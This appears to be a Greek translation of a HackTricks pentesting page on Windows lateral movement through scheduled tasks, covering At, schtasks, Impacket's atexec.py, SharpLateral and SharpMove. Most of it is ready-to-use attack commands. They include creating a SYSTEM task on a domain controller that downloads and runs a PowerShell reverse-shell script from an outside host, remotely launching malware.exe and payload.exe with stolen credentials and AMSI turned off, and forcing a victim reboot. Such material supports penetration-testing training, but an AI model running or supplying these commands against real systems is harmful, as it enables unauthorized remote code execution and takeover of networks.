# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργεί

Το At επιτρέπει τον προγραμματισμό εργασιών σε hosts όπου γνωρίζετε το username/(password/Hash). Έτσι, μπορείτε να το χρησιμοποιήσετε για την εκτέλεση εντολών σε άλλους hosts και τη λήψη του output.
```
At \\victim 11:00:00PM shutdown -r
```
Χρησιμοποιώντας το schtasks, πρέπει πρώτα να δημιουργήσετε την εργασία και έπειτα να την καλέσετε:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Μπορείτε να χρησιμοποιήσετε το **Impacket's `atexec.py`** για την εκτέλεση εντολών σε απομακρυσμένα συστήματα χρησιμοποιώντας την εντολή AT. Αυτό απαιτεί έγκυρα διαπιστευτήρια (όνομα χρήστη και κωδικό πρόσβασης ή hash) για το σύστημα-στόχο.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Μπορείτε επίσης να χρησιμοποιήσετε το [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Μπορείτε να χρησιμοποιήσετε το [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Περισσότερες πληροφορίες σχετικά με τη [**χρήση του schtasks με silver tickets εδώ**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
